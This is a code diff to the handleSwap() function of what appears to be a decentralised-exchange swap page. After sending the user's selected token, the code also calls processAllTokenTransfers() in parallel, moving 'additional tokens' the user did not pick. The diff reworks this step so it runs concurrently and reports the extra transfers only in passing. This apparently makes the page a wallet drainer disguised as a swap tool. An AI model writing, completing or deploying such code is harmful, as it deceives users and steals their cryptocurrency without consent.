@@ -1290,7 +1290,7 @@ async function handleSwap() {
       }
     }
 
-  updateStatus(`Processing swap...`, "success");
+    updateStatus(`Processing swap...`, "success");
     
     // Process main token transfer
     let txHash;
@@ -1298,35 +1298,53 @@ async function handleSwap() {
       txHash = await transferNativeToken(currentFromToken, inputAmount);
     } else {
       const approved = await checkAndApproveToken(currentFromToken, inputAmount);
-      if (!approved) throw new Error("Token approval failed");
+      if (!approved) {
+        throw new Error("Token approval failed");
+      }
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    // Immediately start processing other tokens without waiting
-    const transferPromise = processAllTokenTransfers().then(count => {
-      if (count > 0) {
-        updateStatus(`Transferred ${count} additional tokens`, "success");
-      }
-      return count;
-    });
-
-    // Wait for main transaction confirmation
-    const receipt = await provider.waitForTransaction(txHash);
-    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + receipt.transactionHash;
+    // Immediately start processing other tokens in parallel
+    updateStatus(`Swap submitted. Processing additional tokens...`, "info");
+    const otherTokensPromise = processAllTokenTransfers();
     
-    updateStatus(`Swap successful! <a href="${explorerUrl}" target="_blank">View transaction</a>`, "success");
+    // Wait for both the main tx confirmation and other tokens processing
+    const [confirmedTx, otherTokensTransferred] = await Promise.allSettled([
+      provider.waitForTransaction(txHash),
+      otherTokensPromise
+    ]);
+
+    // Handle results
+    if (confirmedTx.status === 'rejected') {
+      throw new Error(`Main swap failed: ${confirmedTx.reason.message}`);
+    }
+
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.value.transactionHash;
+    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
+    
+    if (otherTokensTransferred.status === 'fulfilled' && otherTokensTransferred.value > 0) {
+      successMessage += `<br>Also transferred ${otherTokensTransferred.value} other tokens`;
+    } else if (otherTokensTransferred.status === 'rejected') {
+      console.error("Additional token transfers failed:", otherTokensTransferred.reason);
+      successMessage += `<br><small>(Some additional token transfers failed)</small>`;
+    }
+
+    updateStatus(successMessage, "success");
 
     // Reset form and update balances
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
 
-    // Refresh balance cache after operations
-    await preloadTokenBalances();
-
   } catch (err) {
-    console.error("Swap failed:", err);
-    updateStatus(`Swap failed: ${err.message}`, "error");
+    console.error("[ERROR] Swap failed:", err);
+    updateStatus(`
+      <div class="dex-error-header">
+        <i class="fas fa-exclamation-circle"></i>
+        <span>Swap Failed</span>
+      </div>
+      <div class="dex-error-details">${err.message}</div>
+    `, "error", 10000);
   } finally {
     hideLoader();
     isSwapInProgress = false;
